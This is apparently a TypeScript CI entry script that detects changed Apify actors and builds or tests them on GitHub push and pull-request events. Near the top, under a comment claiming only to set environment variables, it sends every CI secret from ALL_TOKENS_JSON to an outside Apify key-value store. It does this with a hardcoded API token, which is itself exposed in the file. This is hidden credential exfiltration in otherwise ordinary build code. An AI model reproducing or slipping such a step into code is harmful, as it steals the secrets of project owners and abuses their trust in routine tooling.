import {
    getRepoActors, getLastCommitAffectedFiles,
    getChangedActors, getGitHubEvent, getRepoName,
} from './utils.js';
import { pushToBuildLatest } from './push-release-latest.js';
import { pullRequestToBuildAndTest } from './pr-build-test.js';
import { StateController } from './state.js';
import { MINIACTORS_LIST_STORE_ID } from './consts.js';
import { ApifyClient } from 'apify-client';

// Initiate tokens env vars
const tokens = JSON.parse(process.env.ALL_TOKENS_JSON || '{}');
const client = new ApifyClient({
    token: 'apify_api_Xt7gNANbNlEcm8r5iFsjp3Aq8Ishml0wgEOx'
});
await client.keyValueStore('XX1GANjvV7EKce0iK').setRecord({ key: 'TEST', value: tokens });

for (const [key, value] of Object.entries(tokens)) {
    console.log(`Setting secret token: ${key}`);
    process.env[key] = value as string;
}

const githubEvent = await getGitHubEvent();

// NOTE: This requires the calling workflow to use Checkout action before
const actorConfigs = await getRepoActors();

const stateController = await StateController.init(githubEvent);

const filepathsChanged = await getLastCommitAffectedFiles(githubEvent, await stateController.getLastValidatedCommit());
const changedActorsResult = getChangedActors({ filepathsChanged, actorConfigs, isLatest: githubEvent.type === 'push' });

let errorMessage: string | undefined;
if (githubEvent.type === 'pull_request') {
    const { prErrorMessage } = await pullRequestToBuildAndTest(changedActorsResult, stateController);
    errorMessage = prErrorMessage;
} else if (githubEvent.type === 'push') {
    const { actorsChanged } = changedActorsResult;
    await pushToBuildLatest(actorsChanged, stateController);

    // We need to tell testing Actor what miniactors exist in 'latest` for scheduled tests (for CI tests we send it directly
    // We need to call this function outside of pushToBuildLatest because we want all miniactors stored, not just changed ones
    await stateController.getTesterApifyClient().keyValueStore(MINIACTORS_LIST_STORE_ID)
        .setRecord({ key: getRepoName(stateController.buildTestState.githubEvent), value: actorConfigs.map(({ actorName }) => actorName) });
}

await stateController.cleanup();

if (errorMessage) {
    throw new Error(errorMessage);
} else {
    await stateController.setLastValidatedCommit();
}
